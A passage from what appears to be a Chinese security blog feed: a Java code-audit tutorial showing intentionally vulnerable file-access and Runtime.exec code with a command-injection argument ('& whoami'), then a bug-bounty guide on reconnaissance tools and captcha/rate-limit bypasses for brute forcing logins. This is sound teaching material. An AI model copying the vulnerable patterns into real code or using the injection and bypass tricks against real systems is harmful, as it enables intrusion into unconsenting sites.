href="#任意文件操作类漏洞" class="headerlink" title="任意文件操作类漏洞"></a>任意文件操作类漏洞</h4><h5 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h5><p>​    常见的一些java文件操作类的漏洞:任意文件的读取、下载、删除、修改，这类漏洞的成因基本相同，都是因为程序没有对文件和目录的权限进行严格控制，或者说程序没有验证请求的资源文件是否合法导致的。</p><p>举例:</p><p><strong>任意文件读取</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GET</span><br><span class="line">@<span class="constructor">Path(<span class="string">"/images/&#123;image&#125;"</span>)</span></span><br><span class="line">@<span class="constructor">Produces(<span class="string">"images/*"</span>)</span></span><br><span class="line">public Response get<span class="constructor">Image(@<span class="params">javax</span>.<span class="params">ws</span>.<span class="params">rs</span>.PathParam(<span class="string">"image"</span>)</span> String image) &#123;</span><br><span class="line">    File file = <span class="keyword">new</span> <span class="constructor">File(<span class="string">"resources/images/"</span>, <span class="params">image</span>)</span>; <span class="comment">//Weak point</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!file.exists<span class="literal">()</span>) &#123;</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">Response</span>.</span></span>status(Status.NOT_FOUND).build<span class="literal">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return <span class="module-access"><span class="module"><span class="identifier">Response</span>.</span></span>ok<span class="literal">()</span>.entity(<span class="keyword">new</span> <span class="constructor">FileInputStream(<span class="params">file</span>)</span>).build<span class="literal">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def get<span class="constructor">WordList(<span class="params">value</span>:String)</span> = Action &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="module-access"><span class="module"><span class="identifier">Files</span>.</span></span>exists(<span class="module-access"><span class="module"><span class="identifier">Paths</span>.</span></span>get(<span class="string">"public/lists/"</span> + value))) &#123;</span><br><span class="line">    <span class="constructor">NotFound(<span class="string">"File not found"</span>)</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">val</span> result = <span class="module-access"><span class="module"><span class="identifier">Source</span>.</span></span>from<span class="constructor">File(<span class="string">"public/lists/"</span> + <span class="params">value</span>)</span>.get<span class="constructor">Lines()</span>.mkString <span class="comment">// Weak point</span></span><br><span class="line">    <span class="constructor">Ok(<span class="params">result</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>任意文件写入</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(getExternalFilesDir(TARGET_TYPE), filename);</span><br><span class="line">fos = <span class="keyword">new</span> FileOutputStream(<span class="keyword">file</span>);</span><br><span class="line">fos.<span class="keyword">write</span>(confidentialData.getBytes());</span><br><span class="line">fos.flush();</span><br></pre></td></tr></table></figure><h5 id="审计方法-4"><a href="#审计方法-4" class="headerlink" title="审计方法"></a>审计方法</h5><p>全局搜索关键字或者方法</p><ul><li>FileInputStream</li><li>getPath</li><li>getAbsolutePath</li></ul><p>排查程序的安全策略配置文件，查找permission Java.io.FilePermission，<strong>查看IO方案是否只对程序的绝对路径赋予读写权限。</strong></p><h5 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h5><ul><li>配置全局安全策略</li><li>使用File.getCanonicalPath()方法，该方法会对所有别名、快捷方式以及符号链接进行一致 地解析。特殊的文件名，例如“..”会被移除。</li></ul><h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><h5 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h5><p>服务端没有针对执行命令的函数进行过滤，导致攻击者可以提交恶意构造语句。java中常见如：<code>Runtime.exec() Process ProcessBuilder.start</code></p><h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><p>Java中的命令执行离不开调用反射的机制，在实际的场景往往离不开反序列化的利用。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirList</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">String</span> dir = System.getProperty(“dir”);</span><br><span class="line">        <span class="built_in">Process</span> <span class="built_in">process</span> = null;</span><br><span class="line">        InputStream istream = null;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">process</span> = Runtime.getRuntime().exec(<span class="string">"cmd.exe /c dir"</span> + dir);</span><br><span class="line">            <span class="keyword">int</span> result = <span class="built_in">process</span>.waitFor();</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"process error: "</span> + result);</span><br><span class="line">            &#125;</span><br><span class="line">            istream = (result == <span class="number">0</span>) ? <span class="built_in">process</span>.getInputStream() : <span class="built_in">process</span>.getErrorStream();</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="built_in">buffer</span> = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> (istream.<span class="built_in">read</span>(<span class="built_in">buffer</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">                System.out.<span class="built_in">print</span>(<span class="keyword">new</span> <span class="keyword">String</span>(<span class="built_in">buffer</span>, “gb2312”));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            <span class="keyword">if</span> (istream != null) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    istream.<span class="built_in">close</span>();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">process</span> != null) &#123;</span><br><span class="line">                <span class="built_in">process</span>.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码利用<code>Runtime.exec()</code>方法调用dir命令。</p><p>攻击者可以利用&amp;符号执行多条命令，例如</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Ddir=<span class="string">"..\\ &amp; whoami</span></span><br></pre></td></tr></table></figure><h5 id="审计方法-5"><a href="#审计方法-5" class="headerlink" title="审计方法"></a>审计方法</h5><p>RCE出现的原因和场景很多，以后慢慢学习~</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">服务端直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">服务端不直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、<span class="keyword">JST+EL等</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">由java后端模板引擎注入导致的 </span>RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line"></span><br><span class="line">由<span class="keyword">java一些脚本语言引起的 </span>RCE 漏洞，常见的如：Groovy、<span class="keyword">JavascriptEngine等</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">由第三方开源组件引起的 </span>RCE 漏洞，常见的如：Fastjson、<span class="keyword">Shiro、Xstream、Struts2、weblogic等</span></span><br></pre></td></tr></table></figure><p>审计的时候可以重点寻找：</p><ul><li><p>Runtime.exec()</p></li><li><p>Process</p></li><li><p>ProcessBuilder.start()</p></li></ul><h5 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h5><ul><li>正则表达式匹配用户输入</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="module-access"><span class="module"><span class="identifier">Pattern</span>.</span></span>matches(<span class="string">"[0-9A-Za-z@.]+"</span>, dir)) &#123;</span><br></pre></td></tr></table></figure><h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="成因-6"><a href="#成因-6" class="headerlink" title="成因"></a>成因</h5><p>当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h5 id="审计方法-6"><a href="#审计方法-6" class="headerlink" title="审计方法"></a>审计方法</h5><p>反序列化操作常常出现在<strong>导入模版文件、网络通信、数据传输、日志格式化存储或者数据库存储</strong>等业务功能处,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控。</p><ul><li>ObjectInputStream.readObject</li><li>ObjectInputStream.readUnshared</li><li>XMLDecoder.readObject</li><li>XStream.fromXML</li><li>第三方jar包:ObjectMapper.readValue,jackson中的JSON.parseObject,fastjson中的api</li></ul><h5 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h5><ul><li>升级服务端所依赖的可能被利用的jar包，包括JDK。</li><li>在执行反序列前对InputStream对象进行检查过滤</li></ul><h4 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h4><h5 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h5><p>​    <strong>中间件</strong>是提供系统软件和应用软件之间连接的软件，它将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。</p><p>java常见的中间件:</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="审计方法-7"><a href="#审计方法-7" class="headerlink" title="审计方法"></a>审计方法</h4><p>直接打开pom.xml文件查看其 使用的中间件及其版本，然后到漏洞库里找漏洞即可。</p><img src="QQ截图20210127114728.png" style="zoom: 50%;" /><h5 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h5><p>及时更新项目使用的java中间件的版本。</p><h4 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h4><h5 id="成因-8"><a href="#成因-8" class="headerlink" title="成因"></a>成因</h5><p>​    常见的业务逻辑漏洞主要是越权，分为平行越权和垂直越权。在javaweb的各个功能点中都可能存在越权漏洞。</p><p>主要原因还是因为程序没有对当前用户的权限进行严格控制，或者是后台没有判断当前用户id。</p><h5 id="审计方法-8"><a href="#审计方法-8" class="headerlink" title="审计方法"></a>审计方法</h5><p>在每个<code>request.getParameter(&quot;userid&quot;);</code>之后查看是否有检验当前用户与要进行增删改查的用户。</p><h5 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h5><p>获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。</p><h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><p>java中存在的安全问题还有很多，比如ldap注入、jndi注入、rmi反序列化等等会在后面的文章单独拿出来说，更多的java安全漏洞可以参考先知的java安全手书：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3372</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3460</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3416</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3358</span></span><br></pre></td></tr></table></figure><p>最后推荐一个自动化搜索java敏感函数的脚本:<a href="https://github.com/Cryin/JavaID" target="_blank" rel="noopener">Cryin/JavaID: java source code static code analysis and danger function identify prog (github.com)</a></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/jinqi520/p/10083441.html" target="_blank" rel="noopener">java代码审计中的一些常见漏洞及其特征函数 - 京亟QAQ - 博客园 (cnblogs.com)</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/" target="_blank" rel="noopener">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/</a></p><p><a href="https://xz.aliyun.com/t/7945#toc-13" target="_blank" rel="noopener">java代码审计 - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/1633#toc-11" target="_blank" rel="noopener">JAVA代码审计的一些Tips(附脚本) - 先知社区 (aliyun.com)</a></p><p><a href="http://drops.xmd5.com/static/drops/web-16609.html" target="_blank" rel="noopener">JAVA安全之JAVA服务器安全漫谈 | WooYun知识库 (xmd5.com)</a></p><p><a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF - 先知社区 (aliyun.com)</a></p><p><a href="https://www.freebuf.com/articles/web/253139.html" target="_blank" rel="noopener">看一名Java开发人员以红队思维五分钟审计一套代码（续） - FreeBuf网络安全行业门户</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;title: java代码审计之常见漏洞学习&lt;br&gt;abbrlink: 15301&lt;br&gt;date: 2021-01-27 14:28:28&lt;br&gt;tags:&lt;/p&gt;
&lt;h2 id=&quot;java代码审计之常见漏洞学习&quot;&gt;&lt;a href=&quot;#java代码审计之常见漏洞学习&quot; c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SRC混子的漏洞挖掘之道</title>
    <link href="https://shu1l.github.io/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/"/>
    <id>https://shu1l.github.io/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/</id>
    <published>2021-01-16T13:36:41.000Z</published>
    <updated>2021-01-27T06:27:55.508Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SRC混子的漏洞挖掘之道"><a href="#SRC混子的漏洞挖掘之道" class="headerlink" title="SRC混子的漏洞挖掘之道"></a>SRC混子的漏洞挖掘之道</h2><p>本文首先于先知社区:<a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener">SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com)</a></p><p>一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。</p><h3 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h3><p> 还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括<strong>企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话</strong>等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。</p><h4 id="企业相关信息收集"><a href="#企业相关信息收集" class="headerlink" title="企业相关信息收集"></a>企业相关信息收集</h4><ul><li><p>企查查 (<a href="https://www.qcc.com" target="_blank" rel="noopener">https://www.qcc.com）</a>/)</p></li><li><p>天眼查(<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a>)</p></li><li><p>启信宝（<a href="https://www.qixin.com/" target="_blank" rel="noopener">https://www.qixin.com/</a>)</p><p> 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。</p></li></ul><p><strong>主要查询的信息:</strong></p><ol><li>一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。</li><li>查看同电话企业基本都是子公司。</li><li>查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。</li><li>查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)</li></ol><p>PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。</p><ul><li><p>站长之家:</p><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><ul><li>邮箱反查、注册人反查、电话反查。</li><li>推荐个项目:<a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener">https://github.com/code-scan/BroDomain</a> 兄弟域名查询。</li></ul></li><li><p><a href="https://www.qimai.cn/" target="_blank" rel="noopener">https://www.qimai.cn/</a></p><ul><li>七麦数据，可以查到企业下一些比较冷门的app。</li></ul></li></ul><p><strong>信息整理</strong></p><p>当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息</p><ul><li><p>主公司及分公司、子公司下所有归属的网站域名信息；</p></li><li><p>主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。</p></li><li><p>主公司及分公司、子公司下所有的app资产和微信小程序。</p><p>之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。</p></li></ul><h4 id="子域名收集和网站信息收集"><a href="#子域名收集和网站信息收集" class="headerlink" title="子域名收集和网站信息收集"></a>子域名收集和网站信息收集</h4><p> 子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。</p><h5 id="通过github收集子域名"><a href="#通过github收集子域名" class="headerlink" title="通过github收集子域名"></a>通过github收集子域名</h5><p> 先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。</p><h5 id="oneforAll"><a href="#oneforAll" class="headerlink" title="oneforAll"></a>oneforAll</h5><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p><ul><li>需要到配置文件里填写api接口信息，</li><li>根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。</li></ul><p>命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span> run</span><br><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span>  <span class="params">--brute</span> <span class="literal">true</span> run</span><br></pre></td></tr></table></figure><p> 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。</p><h5 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h5><p>子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码，</p><p><a href="https://github.com/timwhitez/rad-xray" target="_blank" rel="noopener">https://github.com/timwhitez/rad-xray</a> 命令改一下能批量探测子域名，一般5到10分钟一个子域。</p><h5 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h5><p>官网:<a href="https://gobies.org/" target="_blank" rel="noopener">https://gobies.org/</a></p><p> 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:<a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0" target="_blank" rel="noopener">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。</span><br></pre></td></tr></table></figure><p> 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。</p><h5 id="BBScan"><a href="#BBScan" class="headerlink" title="BBScan"></a>BBScan</h5><p>猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。</p><p>项目地址:</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p><a href="https://github.com/yhy0/BBScan" target="_blank" rel="noopener">https://github.com/yhy0/BBScan</a> （添加了springboot的泄露探测）</p><ul><li>可以对域名、ip、C段进行探测</li><li>快速探测管理后台</li><li>进行端口探测</li><li>探测敏感信息泄露</li><li>可以自定义扫描规则</li></ul><p>report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。</p><h5 id="js信息收集"><a href="#js信息收集" class="headerlink" title="js信息收集"></a>js信息收集</h5><p>主要是爬取网站的敏感js文件，js中能收集到的信息:</p><ul><li>增加攻击面(url、域名)</li><li>敏感信息(密码、API密钥、加密方式)</li><li>代码中的潜在危险函数操作</li><li>具有已知漏洞的框架</li></ul><p>常用的工具</p><p>速度很快的jsfinder <a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p><p>xray的rad爬虫 <a href="https://github.com/chaitin/rad" target="_blank" rel="noopener">https://github.com/chaitin/rad</a></p><p>能够匹配敏感信息的JSINFO-SCAN：<a href="https://github.com/p1g3/JSINFO-SCAN" target="_blank" rel="noopener">https://github.com/p1g3/JSINFO-SCAN</a></p><h3 id="捡中低危漏洞的一些技巧"><a href="#捡中低危漏洞的一些技巧" class="headerlink" title="捡中低危漏洞的一些技巧"></a>捡中低危漏洞的一些技巧</h3><p> 刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">框架注入</span><br><span class="line"> 明文密码传输</span><br><span class="line"> 表单破解漏洞</span><br><span class="line"> <span class="selector-tag">IIS</span>短文件名泄露</span><br><span class="line"> 老旧过期的<span class="selector-tag">HTTPS</span>服务</span><br><span class="line"> 跨目录下载漏洞</span><br><span class="line"> 目录可浏览漏洞</span><br><span class="line"> <span class="selector-tag">LFI</span>本地文件包含漏洞</span><br><span class="line"> <span class="selector-tag">RFI</span>远程文件包含漏洞</span><br><span class="line"> <span class="selector-tag">HTTP</span>拒绝服务攻击</span><br><span class="line"> 弱口令登录</span><br><span class="line"> <span class="selector-tag">CSRF</span>跨站点请求伪造</span><br><span class="line"> <span class="selector-tag">Flash</span>点击劫持</span><br><span class="line"> <span class="selector-tag">SQL</span>注入漏洞</span><br><span class="line"> <span class="selector-tag">XSS</span>跨站脚本漏洞</span><br><span class="line"> 文件上传漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:IIS</span>解析漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:Apache</span>解析漏洞</span><br><span class="line"> <span class="selector-tag">Cookies</span>注入漏洞</span><br><span class="line"> 越权访问漏洞</span><br><span class="line"> 命令执行漏洞</span><br><span class="line"> <span class="selector-tag">Struts2</span>远程代码执行漏洞</span><br><span class="line"> 业务逻辑漏洞</span><br><span class="line"> 用户隐私泄露</span><br><span class="line"> 敏感信息泄漏(运维)</span><br><span class="line"> 敏感信息泄漏(研发)</span><br><span class="line"> 敏感文件泄漏(运维)(配置)</span><br><span class="line"> 敏感文件泄漏(运维)(权限)</span><br><span class="line"> 未验证的重定向和传递</span><br><span class="line"> <span class="selector-tag">Flash</span>跨域访问资源</span><br><span class="line"> 测试文件泄漏</span><br><span class="line"> 开启危险的<span class="selector-tag">HTTP</span>方法</span><br><span class="line"> <span class="selector-tag">HTTP</span>参数污染</span><br><span class="line"> <span class="selector-tag">Unicode</span>编码绕过</span><br><span class="line"> 源码泄漏</span><br><span class="line"> 后台目录泄漏</span><br><span class="line"> 链接注入漏洞</span><br><span class="line"> <span class="selector-tag">SSRF</span>服务器请求伪造</span><br><span class="line"> <span class="selector-tag">jsonp</span>劫持</span><br></pre></td></tr></table></figure><p>学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。</p><ul><li>乌云漏洞库:<a href="https://wooyun.x10sec.org/" target="_blank" rel="noopener">https://wooyun.x10sec.org/</a></li><li>hackone报告：<a href="https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA" target="_blank" rel="noopener">https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA</a> 提取码:2klt</li></ul><p>这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。</p><h4 id="登录框处常见的一些漏洞"><a href="#登录框处常见的一些漏洞" class="headerlink" title="登录框处常见的一些漏洞"></a>登录框处常见的一些漏洞</h4><p> 在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。</p><p><strong>现在还能用的接码平台:</strong></p><ul><li><a href="http://www.114sim.com/" target="_blank" rel="noopener">http://www.114sim.com/</a></li><li><a href="https://yunduanxin.net/China-Phone-Number/" target="_blank" rel="noopener">https://yunduanxin.net/China-Phone-Number/</a></li><li><a href="https://www.materialtools.com/" target="_blank" rel="noopener">https://www.materialtools.com/</a></li></ul><h5 id="绕过限制导致的爆破、撞库、用户遍历漏洞"><a href="#绕过限制导致的爆破、撞库、用户遍历漏洞" class="headerlink" title="绕过限制导致的爆破、撞库、用户遍历漏洞"></a>绕过限制导致的爆破、撞库、用户遍历漏洞</h5><p>最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势:</p><ul><li><p>验证码不刷新</p></li><li><p>验证码抓包绕过</p></li><li><p>验证码删除绕过</p></li><li><p>验证码置空绕过</p></li><li><p>修改xff头绕过:推荐个burp插件,<a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" 